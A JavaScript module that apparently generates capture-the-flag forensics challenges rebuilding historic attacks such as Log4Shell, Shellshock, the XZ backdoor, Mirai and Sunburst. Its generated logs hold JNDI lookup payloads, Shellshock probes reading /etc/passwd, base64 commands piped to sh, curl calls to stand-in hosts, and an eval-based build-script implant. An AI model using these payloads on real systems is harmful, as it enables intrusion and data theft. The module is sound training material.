'use strict';
/* Hall of Legends: sandbox rebuilds of the attacks that changed security. Concepts only, nothing real. */
const U = require('./util');
const { GH, pubip, ip, NAMES, word, uniqWords, text, readme, noiseLine, b64, hexs, revs, rot, md5, iso, hmsOf, PATHS } = U;
const fam = [];
const R13 = "tr 'A-Za-z' 'N-ZA-Mn-za-m'";
const hostName = (r, used) => { let n; do n = word(r) + r.int(1, 99); while (used.has(n)); used.add(n); return n; };
const safe64 = (host, flag) => { for (let i = 0; i < 5000; i++) { const t = 'curl http://' + host + '/x?n=' + i + '&k=' + flag; if (!/[+/]/.test(b64(t))) return b64(t); } return b64('curl ' + host + ' ' + flag + '          '); };
const common = { cat: 'Legends', levels: 3, tier: () => 6 };

/* ---- 1988 Morris Worm: weak passwords and trust between machines ---- */
fam.push(Object.assign({}, common, {
  id: 'morris', title: 'Morris Worm, 1988', type: 'flag',
  blurb: 'Crack a weak account, then ride the trust between machines.',
  brief: (lv) => 'The first internet worm spread by guessing weak passwords and abusing trust. A stolen copy of the password file is on this machine. Crack the service account, then follow the trust to the last machine of a ' + (lv + 1) + '-machine chain. The flag is there.',
  build: (c, lv) => {
    const r = c.rnd, used = new Set(), users = ['svc', 'ops', 'batch', 'relay'], names = [], hosts = {}, words = uniqWords(r, 120).map((w) => w.replace('-', ''));
    const pw = r.pick(words); names.push('main'); for (let i = 1; i <= lv; i++) names.push(hostName(r, used));
    const shadow = ['root', 'daemon', 'guest', 'lp', 'sync'].map((u) => u + ':' + md5(r.hex(12) + '\n')); shadow.splice(r.int(1, 4), 0, users[0] + ':' + md5(pw + '\n'));
    const pass = [pw]; for (let i = 1; i <= lv; i++) pass.push('p' + r.hex(10));
    const main = { name: 'arena', files: Object.assign(readme('A copy of the password file is /srv/shadow.copy. Format: user:md5hash (made like echo WORD | md5sum).\nThe service account is ' + users[0] + '. Words to try: wordlist.txt\nOnce you are in, machines that trust each other leave notes for each other.'), { '/srv/shadow.copy': text(shadow), [GH + '/wordlist.txt']: text(words) }) };
    hosts.main = main;
    for (let i = 1; i <= lv; i++) {
      const u = users[i - 1], files = { ['/home/' + u + '/readme']: 'trusted host\n' };
      if (i < lv) { const nu = users[i]; files['/home/' + u + '/.netrc'] = 'machine ' + names[i + 1] + ' login ' + nu + ' password ' + pass[i + 1] + '\n'; files['/home/' + u + '/.rhosts'] = names[i + 1] + ' ' + nu + '\n'; }
      else files['/home/' + u + '/flag.txt'] = c.flag + '\n';
      hosts[names[i]] = { name: names[i], files, start: { user: u, cwd: '/home/' + u }, auth: { [u]: { pass: pass[i - 1 + 0] } } };
    }
    // the account on host i is users[i-1]; its password is pass[i-1]; pass[0] is the cracked one
    return { motd: 'November 1988. Something is crawling the network.', hosts, meta: { pw, h: md5(pw + '\n'), names, users, pass, lv } };
  },
  solve: (b) => {
    const m = b.meta, cmds = ['grep ' + m.users[0] + ' /srv/shadow.copy', 'for w in $(cat wordlist.txt); do echo "$w $(echo $w | md5sum)"; done | grep ' + m.h];
    for (let i = 1; i <= m.lv; i++) { cmds.push('sshpass -p ' + m.pass[i - 1] + ' ssh ' + m.users[i - 1] + '@' + m.names[i]); if (i < m.lv) cmds.push('cat .netrc'); }
    cmds.push('cat flag.txt'); return cmds;
  }
}));

/* ---- 2008 Kaminsky: DNS cache poisoning ---- */
fam.push(Object.assign({}, common, {
  id: 'kaminsky', title: 'Kaminsky Cache, 2008', type: (lv) => 'answer',
  blurb: 'Find the forged DNS answer that a resolver accepted.',
  brief: (lv) => ['A resolver cache was poisoned. Compare /var/cache/resolver.cache with the real zone /etc/zones/corp.zone. Submit the NAME of the record that differs.', 'Same incident, next question: submit the IP address of the attacker who sent the forged answer that was ACCEPTed (see /var/log/resolver.log).', 'Same incident, hard mode. Submit the transaction id (the number after txid=) of the forged response that the resolver ACCEPTed. The logs are split across files.'][lv - 1],
  build: (c, lv) => {
    const r = c.rnd, N = 40 + lv * 20, names = uniqWords(r, N).map((w) => w + '.corp.test'), ns = pubip(r), att = pubip(r), bad = r.pick(names), tx = String(r.int(10000, 99999));
    const zone = names.map((n) => n + ' ' + ip(r)), cache = zone.map((z) => z.split(' ')[0] === bad ? bad + ' ' + att : z);
    const L = []; let s = r.int(1000, 3000);
    names.forEach((n) => { const t = String(r.int(10000, 99999)); L.push(iso(s) + ' QUERY ' + n + ' txid=' + t); L.push(iso(s + 1) + ' RESP src=' + ns + ' txid=' + t + ' ' + n + ' ans=' + zone.find((z) => z.indexOf(n + ' ') === 0).split(' ')[1] + (n === bad ? ' DROP' : ' ACCEPT')); s += r.int(2, 30); });
    for (let i = 0; i < 40 * lv; i++) L.push(iso(s + r.int(0, 3)) + ' RESP src=' + att + ' txid=' + String(r.int(10000, 99999)) + ' ' + bad + ' ans=' + att + ' DROP');
    L.push(iso(s + 2) + ' RESP src=' + att + ' txid=' + tx + ' ' + bad + ' ans=' + att + ' ACCEPT');
    L.sort(); const files = { '/etc/zones/corp.zone': text(zone), '/var/cache/resolver.cache': text(cache) };
    if (lv === 3) { const h = Math.floor(L.length / 2); files['/var/log/resolver.log'] = text(L.slice(0, h)); files['/var/log/resolver.log.1'] = text(L.slice(h)); } else files['/var/log/resolver.log'] = text(L);
    return { motd: 'The resolver says everything is fine. It is not.', hosts: { main: { name: 'arena', files: Object.assign(readme('The real answers are in /etc/zones/corp.zone. The resolver keeps what it believes in /var/cache/resolver.cache. Its log is in /var/log.'), files) } }, answer: lv === 1 ? bad : lv === 2 ? att : tx, meta: { bad, att, tx } };
  },
  solve: (b, c) => {
    const m = b.meta;
    if (!m) return [];
    return ['cat /etc/zones/corp.zone /var/cache/resolver.cache | sort | uniq -u | cut -d" " -f1 | sort -u', "grep -r ACCEPT /var/log | grep ' " + m.bad + " '"];
  }
}));

/* ---- 2014 Heartbleed: reading memory that was never yours ---- */
fam.push(Object.assign({}, common, {
  id: 'heartbleed', title: 'Heartbleed, 2014', type: 'flag',
  blurb: 'A server leaked its memory. Dig the secret out of the dump.',
  brief: (lv) => 'A heartbeat request asked for more bytes than it sent, and the server answered with what was next to it in memory. The dump is /var/dump/heap.hex as hex text. Turn it back into bytes and find the private key line' + (lv > 1 ? ' (its value is encoded: ' + (lv === 2 ? 'base64' : 'base64, then reversed') + ')' : '') + '. The flag is inside.',
  build: (c, lv) => {
    const r = c.rnd, L = []; const junk = () => r.pick(['GET /index HTTP/1.1', 'user=' + r.pick(NAMES) + ' sid=' + r.hex(16), 'cookie=' + r.hex(24), 'HB len=' + r.int(1, 64) + ' payload=ok', 'Host: ' + word(r) + '.test', 'pass=' + r.hex(8)]);
    const val = lv === 1 ? c.flag : lv === 2 ? b64(c.flag) : b64(revs(c.flag));
    for (let i = 0; i < 90 + lv * 20; i++) L.push(junk()); L.splice(r.int(30, L.length - 20), 0, 'PRIVATE_KEY=' + val); L.splice(r.int(5, 25), 0, 'PRIVATE_KEY_OLD=' + b64('expired-' + r.hex(6)));
    const hx = hexs(L.join('\n') + '\n'), lines = []; for (let i = 0; i < hx.length; i += 64) lines.push(hx.slice(i, i + 64));
    return { motd: 'The padlock was a lie.', hosts: { main: { name: 'arena', files: Object.assign(readme('/var/dump/heap.hex is hex text. Join the lines, turn them back into bytes with xxd -r -p, then search.\nThere is an old key and the real one. The real one is PRIVATE_KEY (without a suffix).'), { '/var/dump/heap.hex': text(lines) }) } }, meta: { lv } };
  },
  solve: (b) => ["cat /var/dump/heap.hex | tr -d '\\n' | xxd -r -p | grep PRIVATE_KEY= | cut -d= -f2" + (b.meta.lv === 1 ? '' : ' | base64 -d' + (b.meta.lv === 3 ? ' | rev' : ''))]
}));

/* ---- 2016 Dirty COW: winning a race ---- */
fam.push(Object.assign({}, common, {
  id: 'dirtycow', title: 'Dirty COW, 2016', type: 'answer',
  blurb: 'Two threads race. Find the moment the read-only file changed.',
  brief: (lv) => ['A race between a writer and madvise eventually succeeded. In /var/log/race.log, submit the iteration number (iter=) where the result was WRITTEN.', 'Several threads raced. Submit the thread number (thread=) of the one whose result was WRITTEN.', 'Submit how many writes were lost (write=lost) before the winning one. Count them in the whole log.'][lv - 1],
  build: (c, lv) => {
    const r = c.rnd, N = 300 * lv, th = lv === 1 ? 1 : 4, win = r.int(Math.floor(N * .6), N - 5), wt = r.int(1, th), L = []; let t = r.int(100, 900), lost = 0;
    for (let i = 1; i <= N; i++) { const thr = i === win ? wt : r.int(1, th), w = i === win ? 'ok' : 'lost'; if (i < win && w === 'lost') lost++; L.push('t=' + t + ' thread=' + thr + ' iter=' + i + ' write=' + w + ' madvise=ok result=' + (i === win ? 'WRITTEN' : 'RO')); t += r.int(1, 9); if (i === win) break; }
    const done = L.length, ans = lv === 1 ? win : lv === 2 ? wt : lost;
    return { motd: 'Copy on write. Until it is not.', hosts: { main: { name: 'arena', files: Object.assign(readme('One log: /var/log/race.log. Each line is one attempt. result=RO means the file stayed read-only.'), { '/var/log/race.log': text(L) }) } }, answer: String(ans), meta: { win, wt, lost, done, lv } };
  },
  solve: (b) => (b.meta.lv === 3 ? ['grep -c "write=lost" /var/log/race.log'] : ['grep WRITTEN /var/log/race.log'])
}));

/* ---- 2017 EternalBlue: from a scan to a worm-grade chain ---- */
fam.push(Object.assign({}, common, {
  id: 'eternalblue', title: 'EternalBlue, 2017', type: 'flag',
  blurb: 'Find the unpatched SMBv1 host and chain through the network.',
  brief: (lv) => 'Each machine has a scan of its neighbours in /srv/scan.txt. The vulnerable one runs smb=v1 with patch=none. Its credentials lie in a backup on the current machine. Chain through ' + (lv + 0) + ' vulnerable host' + (lv > 1 ? 's' : '') + ' to reach the flag.',
  build: (c, lv) => {
    const r = c.rnd, used = new Set(), hosts = {}, names = ['main'], users = [], pass = [];
    for (let i = 1; i <= lv; i++) { names.push(hostName(r, used)); users.push(r.pick(NAMES)); pass.push('p' + r.hex(10)); }
    const scan = (i) => { const L = []; for (let k = 0; k < 14; k++) { const n = hostName(r, used); L.push(n + ' port=445 smb=' + r.pick(['v2', 'v3', 'v2']) + ' patch=' + r.pick(['yes', 'yes', 'none'])); L.push(n + ' port=22 ssh=open'); } L.push(names[i + 1] + ' port=445 smb=v1 patch=none'); for (let k = 0; k < 4; k++) L.push(hostName(r, used) + ' port=445 smb=v1 patch=yes'); return L.sort(() => r.int(0, 1) ? 1 : -1); };
    const mk = (i) => { const files = { '/srv/scan.txt': text(scan(i)) }; if (i === 0) files[GH + '/README.txt'] = 'Scan results: /srv/scan.txt. The share with backups is /srv/share.\n'; files['/srv/share/backup/creds.b64'] = b64(users[i] + ':' + pass[i]) + '\n'; return files; };
    hosts.main = { name: 'arena', files: mk(0) };
    for (let i = 1; i <= lv; i++) { const f = i < lv ? mk(i) : {}; if (i === lv) f['/home/' + users[i - 1] + '/flag.txt'] = c.flag + '\n'; hosts[names[i]] = { name: names[i], files: f, start: { user: users[i - 1], cwd: '/home/' + users[i - 1] }, auth: { [users[i - 1]]: { pass: pass[i - 1] } } }; }
    return { motd: 'Ports are open. Some should not be.', hosts, meta: { names, users, pass, lv } };
  },
  solve: (b) => {
    const m = b.meta, cmds = [];
    for (let i = 1; i <= m.lv; i++) { cmds.push("grep 'smb=v1' /srv/scan.txt | grep 'patch=none'"); cmds.push('cat /srv/share/backup/creds.b64 | base64 -d'); cmds.push('sshpass -p ' + m.pass[i - 1] + ' ssh ' + m.users[i - 1] + '@' + m.names[i]); }
    cmds.push('cat flag.txt'); return cmds;
  }
}));

/* ---- 2021 Log4Shell: one log line, remote control ---- */
fam.push(Object.assign({}, common, {
  id: 'log4shell', title: 'Log4Shell, 2021', type: (lv) => (lv === 3 ? 'flag' : 'answer'),
  blurb: 'Hunt the JNDI lookups hiding in a web log.',
  brief: (lv) => ['Attackers sent a ${jndi:...} lookup in a header. Submit the host the vulnerable server was told to call back to.', 'Now the attackers hide the word jndi with ${lower:...} tricks. Submit the callback host (the part after ://).', 'One callback carried a base64 command (Base64/...). Decode it (the same line appears more than once, so dedupe with sort -u). The flag is inside the command.'][lv - 1],
  build: (c, lv) => {
    const r = c.rnd, N = 200 + lv * 80, host = word(r) + '-' + r.hex(3) + '.test', L = [], uas = ['Mozilla/5.0', 'curl/8.4', 'Go-http-client/1.1', 'python-requests/2.31'];
    const line = (s, ua) => pubip(r) + ' - [' + hmsOf(s) + '] GET ' + r.pick(PATHS) + ' 200 ' + r.int(200, 9999) + ' "' + ua + '"';
    for (let i = 0; i < N; i++) L.push(line(r.int(0, 86399), r.pick(uas) + (r.int(0, 9) === 0 ? ' ${date}' : '')));
    const hit = lv === 1 ? '${jndi:ldap://' + host + ':1389/a}' : lv === 2 ? '${${lower:j}${lower:n}${lower:d}i:${lower:l}dap://' + host + ':1389/a}' : '${jndi:ldap://' + host + ':1389/Basic/Command/Base64/' + safe64(host, c.flag) + '}';
    for (let i = 0; i < 3; i++) L.push(line(r.int(0, 86399), hit));
    if (lv === 3) for (let i = 0; i < 4; i++) L.push(line(r.int(0, 86399), '${jndi:ldap://' + word(r) + '-' + r.hex(3) + '.test:1389/a}'));
    L.sort((a, b) => (a.split('[')[1] < b.split('[')[1] ? -1 : 1));
    return { motd: 'One innocent header.', hosts: { main: { name: 'arena', files: Object.assign(readme('Access log: /var/log/access.log. The user agent is the last quoted field.'), { '/var/log/access.log': text(L) }) } }, answer: host, meta: { host, lv } };
  },
  solve: (b) => b.meta.lv === 1 ? ['grep jndi /var/log/access.log'] : b.meta.lv === 2 ? ["grep lower /var/log/access.log | grep -o 'dap://[a-z0-9.-]*'"] : ["grep Base64 /var/log/access.log | grep -o 'Base64/[A-Za-z0-9=]*' | sort -u | cut -d/ -f2 | base64 -d"]
}));

/* ---- 2024 XZ backdoor: the implant in a trusted build ---- */
fam.push(Object.assign({}, common, {
  id: 'xzdoor', title: 'XZ Backdoor, 2024', type: 'flag',
  blurb: 'A build script quietly decodes a test file into code. Do the same.',
  brief: (lv) => 'A release tarball is unpacked in /srv/xz. A build script runs a pipeline over a "test file" and executes the result. Find that line, apply the same pipeline to the file yourself (never run it), and read the payload. The flag is inside.',
  build: (c, lv) => {
    const r = c.rnd, file = 'bad-' + r.int(1, 9) + '-' + word(r) + '.xz', payload = '# stage 2 (pretend)\nexport KEY=' + c.flag + '\n';
    let blob = lv === 1 ? rot(payload, 13) : rot(b64(payload), 13); if (lv === 3) blob = revs(blob); blob = blob.replace(/\n/g, '');
    const pipe = 'cat tests/files/' + file + (lv === 3 ? ' | rev' : '') + ' | ' + R13 + (lv > 1 ? ' | base64 -d' : '');
    const files = { '/srv/xz/build-to-host.m4': 'dnl build helper\nAC_DEFUN([X],[\n  gl_x=$(echo ' + r.hex(6) + ' | tr a-f A-F)\n  eval "$(' + pipe + ')"\n])\n', '/srv/xz/README': 'xz-like utils, release tarball. Totally normal.\n', ['/srv/xz/tests/files/' + file]: blob + '\n' };
    for (let i = 0; i < 12; i++) files['/srv/xz/tests/files/good-' + i + '-' + word(r) + '.xz'] = r.hex(40) + '\n';
    files['/srv/xz/configure.ac'] = 'AC_INIT([xz-like],[5.6.1])\nAC_PROG_CC\nm4_include([build-to-host.m4])\n';
    return { motd: 'Two years of patient trust, and one build script.', hosts: { main: { name: 'arena', files: Object.assign(readme('The tarball is in /srv/xz. Look at the build scripts. Search for tr, which transforms text, and read the line that uses it.'), files) } }, meta: { pipe: pipe.replace('cat tests/', 'cat /srv/xz/tests/') } };
  },
  solve: (b) => ["grep -r 'tr ' /srv/xz", b.meta.pipe]
}));

/* ---- 2014 Shellshock: a function hidden in a header ---- */
fam.push(Object.assign({}, common, {
  id: 'shellshock', title: 'Shellshock, 2014', type: (lv) => (lv === 3 ? 'flag' : 'answer'),
  blurb: 'A function smuggled into a header. Find who sent it.',
  brief: (lv) => ['Bash ran code that was smuggled into an environment variable, and web servers passed headers straight into it. Submit the IP address that sent a user agent beginning with "() {".', 'Several scanners probed the server, but only one made it fail with a 500 error. Submit that IP.', 'One probe carried a base64 command. Decode it and read the flag.'][lv - 1],
  build: (c, lv) => {
    const r = c.rnd, N = 160 + lv * 60, L = [], uas = ['Mozilla/5.0', 'curl/8.4', 'Go-http-client/1.1', 'python-requests/2.31'];
    const line = (a, st, ua) => a + ' - [' + hmsOf(r.int(0, 86399)) + '] GET /cgi-bin/' + r.pick(['status', 'env', 'report', 'health']) + ' ' + st + ' ' + r.int(200, 9999) + ' "' + ua + '"';
    for (let i = 0; i < N; i++) L.push(line(pubip(r), r.pick([200, 200, 200, 304, 404]), r.pick(uas)));
    const probe = () => '() { :;}; ' + r.pick(['/bin/id', '/bin/cat /etc/passwd', '/usr/bin/whoami', '/bin/uname -a']);
    const host = word(r) + '-' + r.hex(3) + '.test', att = pubip(r), scan = [pubip(r), pubip(r), pubip(r)];
    if (lv === 1) for (let i = 0; i < 3; i++) L.push(line(att, 200, probe()));
    else if (lv === 2) { scan.forEach((a) => { for (let i = 0; i < 2; i++) L.push(line(a, 200, probe())); }); for (let i = 0; i < 2; i++) L.push(line(att, 500, probe())); }
    else { scan.forEach((a) => L.push(line(a, 200, probe()))); L.push(line(att, 200, '() { :;}; echo ' + safe64(host, c.flag) + ' | base64 -d | sh')); }
    L.sort((x, y) => (x.split('[')[1] < y.split('[')[1] ? -1 : 1));
    return { motd: 'September 2014. Bash has a bug older than most of its users.', hosts: { main: { name: 'arena', files: Object.assign(readme('Access log: /var/log/access.log. The user agent is the last quoted field. The status code comes just before the size.'), { '/var/log/access.log': text(L) }) } }, answer: att, meta: { att, lv } };
  },
  solve: (b) => b.meta.lv === 1 ? ["grep ':;};' /var/log/access.log"] : b.meta.lv === 2 ? ["grep ':;};' /var/log/access.log | grep ' 500 ' | cut -d' ' -f1"] : ["grep base64 /var/log/access.log | grep -o 'echo [A-Za-z0-9=]*' | cut -d' ' -f2 | base64 -d"]
}));

/* ---- 2016 Mirai: default passwords at internet scale ---- */
fam.push(Object.assign({}, common, {
  id: 'mirai', title: 'Mirai, 2016', type: (lv) => (lv === 3 ? 'flag' : 'answer'),
  blurb: 'Cameras with factory passwords became an army. Read the telnet log.',
  brief: (lv) => ['A botnet scanned the internet for devices that still used factory passwords. One scanner finally got in. Submit its IP address.', 'That scanner guessed many default logins first. Submit how many failed attempts it made before it got in.', 'Once inside, the bot ran a command carrying a base64 payload. Decode it and read the flag.'][lv - 1],
  build: (c, lv) => {
    const r = c.rnd, L = [], users = ['root', 'admin', 'support', 'user', 'guest'];
    const t = () => '2026-11-26 ' + hmsOf(r.int(0, 80000)), host = word(r) + '-' + r.hex(3) + '.test', att = pubip(r), k = r.int(9, 24), pid = () => r.int(200, 4000);
    for (let i = 0; i < 180 + lv * 40; i++) L.push(t() + ' telnetd[' + pid() + ']: Failed login ' + r.pick(users) + ' from ' + pubip(r));
    const t0 = r.int(0, 60000), tl = (o) => '2026-11-26 ' + hmsOf(t0 + o);
    for (let i = 0; i < k; i++) L.push(tl(i * 2) + ' telnetd[' + pid() + ']: Failed login ' + r.pick(users) + ' from ' + att);
    L.push(tl(k * 2 + 1) + ' telnetd[' + pid() + ']: Accepted login root from ' + att);
    L.push(tl(k * 2 + 3) + ' session ' + att + ' ran: echo ' + safe64(host, c.flag) + ' | base64 -d > /tmp/.x');
    L.push(t() + ' session 10.0.0.' + r.int(2, 50) + ' ran: ls -la /var/log');
    L.sort();
    return { motd: 'October 2016. Ten thousand cameras, one password: the one on the sticker.', hosts: { main: { name: 'arena', files: Object.assign(readme('Telnet log: /var/log/telnet.log. Lines say Failed or Accepted, the user, and the address after "from".'), { '/var/log/telnet.log': text(L) }) } }, answer: lv === 1 ? att : String(k), meta: { att, k, lv } };
  },
  solve: (b) => { const m = b.meta; return m.lv === 1 ? ['grep Accepted /var/log/telnet.log'] : m.lv === 2 ? ['grep Accepted /var/log/telnet.log', 'grep Failed /var/log/telnet.log | grep ' + m.att + ' | wc -l'] : ['grep Accepted /var/log/telnet.log', 'grep ran: /var/log/telnet.log | grep ' + m.att + " | grep -o 'echo [A-Za-z0-9=]*' | cut -d' ' -f2 | base64 -d"]; }
}));

/* ---- 2017 WannaCry: the kill switch ---- */
fam.push(Object.assign({}, common, {
  id: 'wannacry', title: 'WannaCry, 2017', type: (lv) => (lv === 3 ? 'flag' : 'answer'),
  blurb: 'A worm that asked one question first. Find the domain that stopped it.',
  brief: (lv) => ['The worm looked up one odd domain before spreading. When nobody had registered it, the lookup failed and the worm went on. Submit the domain most hosts failed to resolve.', 'Count the infected machines: how many different hosts looked up that domain?', 'A researcher registered the domain and left a note in a TXT record. Decode it and read the flag.'][lv - 1],
  build: (c, lv) => {
    const r = c.rnd, L = [], kill = r.hex(14) + r.hex(14) + '.test', host = word(r) + '-' + r.hex(3) + '.test', n = 12 + lv * 6;
    const t = () => '2026-11-26 ' + hmsOf(r.int(0, 86399));
    const row = (src, name, res, ty) => t() + ' ' + src + ' query ' + name + ' ' + (ty || 'A') + ' ' + res;
    const srcs = []; while (srcs.length < n) { const a = ip(r); if (srcs.indexOf(a) < 0) srcs.push(a); }
    srcs.forEach((a) => { L.push(row(a, kill, 'NXDOMAIN')); if (r.int(0, 2) === 0) L.push(row(a, kill, 'NXDOMAIN')); });
    for (let i = 0; i < 160 + lv * 40; i++) L.push(row(ip(r), word(r) + '-' + r.hex(2) + '.test', 'NOERROR'));
    for (let i = 0; i < 30; i++) L.push(row(ip(r), word(r) + r.int(1, 99) + '.test', 'NXDOMAIN'));
    L.push(t() + ' researcher query ' + kill + ' TXT "' + safe64(host, c.flag) + '"');
    L.sort();
    return { motd: 'May 2017. One DNS question decided the fate of the worm.', hosts: { main: { name: 'arena', files: Object.assign(readme('DNS log: /var/log/dns.log. Fields: date, time, source, "query", name, type, result. Use cut -d" " -f5 to read the name.'), { '/var/log/dns.log': text(L) }) } }, answer: lv === 1 ? kill : String(n), meta: { kill, n, lv } };
  },
  solve: (b) => { const m = b.meta, top = "grep NXDOMAIN /var/log/dns.log | cut -d' ' -f5 | sort | uniq -c | sort -rn | head -1"; return m.lv === 1 ? [top] : m.lv === 2 ? [top, 'grep ' + m.kill + " /var/log/dns.log | grep NXDOMAIN | cut -d' ' -f3 | sort -u | wc -l"] : ["grep TXT /var/log/dns.log | grep -o '\"[A-Za-z0-9=]*\"' | tr -d '\"' | base64 -d"]; }
}));

/* ---- 2020 SolarWinds / Sunburst: data hidden in DNS names ---- */
fam.push(Object.assign({}, common, {
  id: 'sunburst', title: 'Sunburst, 2020', type: (lv) => (lv === 3 ? 'flag' : 'answer'),
  blurb: 'A trusted update phoned home inside DNS names. Find the pattern.',
  brief: (lv) => ['A software update quietly sent data out as very long hexadecimal names. Submit the second label of the command domain (the word between the first and second dots).', 'Many hosts beaconed to it, one far more than the rest. Submit that host name.', 'The last beacons carry data hex-encoded in the name. Join and decode them to read the flag.'][lv - 1],
  build: (c, lv) => {
    const r = c.rnd, L = [], parent = word(r) + r.int(10, 99), hs = []; for (let i = 0; i < 8; i++) hs.push(r.pick(['ws', 'srv', 'db', 'app']) + '-' + r.int(10, 99));
    const uniq = Array.from(new Set(hs)), top = uniq[0], t = () => '2026-11-26 ' + hmsOf(r.int(0, 80000));
    const q = (h, n) => t() + ' ' + h + ' query: ' + n + ' A';
    for (let i = 0; i < 200 + lv * 60; i++) L.push(q(r.pick(uniq), 'www.' + word(r) + '-' + r.hex(3) + '.test'));
    const bea = (h, txt) => q(h, hexs(txt) + '.' + parent + '.test');
    for (let i = 0; i < 14; i++) L.push(bea(top, 'ping' + r.hex(8)));
    uniq.slice(1, 5).forEach((h) => { for (let i = 0; i < 2; i++) L.push(bea(h, 'ping' + r.hex(8))); });
    if (lv === 3) { L.push('2026-11-26 23:58:01 ' + top + ' query: ' + hexs('exfil:') + '.' + parent + '.test A'); L.push('2026-11-26 23:58:02 ' + top + ' query: ' + hexs(c.flag) + '.' + parent + '.test A'); }
    L.sort();
    return { motd: 'December 2020. The update was signed. That was the problem.', hosts: { main: { name: 'arena', files: Object.assign(readme('DNS log: /var/log/dns.log. Fields: date, time, host, "query:", name, type. The name is field 5. Hex names decode with xxd -r -p.'), { '/var/log/dns.log': text(L) }) } }, answer: lv === 1 ? parent : top, meta: { parent, top, lv } };
  },
  solve: (b) => { const m = b.meta, hx = "grep -E '[0-9a-f]{24}' /var/log/dns.log"; return m.lv === 1 ? [hx + " | cut -d' ' -f5 | cut -d. -f2 | sort -u"] : m.lv === 2 ? [hx + " | cut -d' ' -f3 | sort | uniq -c | sort -rn | head -1"] : [hx + ' | grep ' + m.top + " | cut -d' ' -f5 | cut -d. -f1 | tr -d '\\n' | xxd -r -p"]; }
}));

module.exports = fam;
